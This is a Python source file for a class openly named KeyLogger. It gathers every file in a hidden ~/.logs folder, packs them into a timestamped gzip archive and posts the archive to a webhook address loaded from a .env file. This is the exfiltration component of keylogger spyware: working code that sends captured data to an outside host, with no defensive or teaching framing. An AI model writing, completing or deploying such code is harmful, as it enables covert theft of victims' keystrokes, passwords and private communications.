from dotenv import dotenv_values # dont forget to replace this to argparse 
from datetime import datetime
import requests
import logging
import gzip
import shutil
import os
import tarfile


class KeyLogger:
    def __init__(self, webhook_url, logs_dir):
        self.url = webhook_url
        self.logs_dir = logs_dir
        self.interval = 30 # in seconds
    

    """Compress all file in the specified directory `logs_dir`"""
    def compress_files(self):
        os.chdir(self.logs_dir)

        # combine all files into one tar file
        now = datetime.now().strftime("%H%M%S_%d-%m-%Y") # get current time and date
        tar_file = now + ".tar"
        with tarfile.open(tar_file, "w") as tar:
            for path in os.scandir(self.logs_dir): # locate all files in the log directory
                tar.add(path.name)

        # compress the tar file with gzip
        gzip_file = tar_file + ".gz"
        with open(tar_file, 'rb') as f_in:
            with gzip.open(gzip_file, 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out)

        logging.info("Compression completed!")
        return gzip_file


    """Send the log file with webhook"""
    def send_log(self):  
        filename = self.compress_files()

        with open(filename, 'rb') as file:
            compressed_data = file.read()

        result = requests.post(self.url, files={filename: compressed_data})
        logging.info("Send completed! ")


def main():
    logging.basicConfig(level=logging.INFO)
    #logging.disable(logging.INFO)

    # get environment variables
    config = dotenv_values(".env")
    WEBHOOK_URL = config['WEBHOOK_URL']
    
    # initialize keylogger object
    logs_dir = os.path.join(os.path.expanduser("~"), ".logs") # [!] dont forget to make the log folder
    keylogger = KeyLogger(WEBHOOK_URL, logs_dir)
    keylogger.send_log()


if __name__ == "__main__":
    main()